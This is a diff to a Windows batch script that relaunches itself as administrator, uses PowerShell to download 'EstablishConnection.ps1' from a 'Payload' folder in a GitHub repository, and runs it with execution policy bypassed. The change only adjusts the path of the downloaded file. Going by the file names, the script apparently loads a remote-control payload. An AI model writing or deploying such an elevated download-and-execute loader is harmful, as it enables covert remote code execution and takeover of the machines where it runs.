@@ -12,7 +12,7 @@ if %errorlevel% neq 0 (
 if "%1"=="RunAs_Admin" (
     :: Run PowerShell as admin and execute your code
     powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d32a82143adcca323a8f82aa1bef1edab65af7da/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'"
-    PowerShell -ExecutionPolicy Bypass -File "%~dp0EstablishConnection.ps1"
+    PowerShell -ExecutionPolicy Bypass -File ".\EstablishConnection.ps1"
 ) else (
     echo Running script as administrator...
     powershell -command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
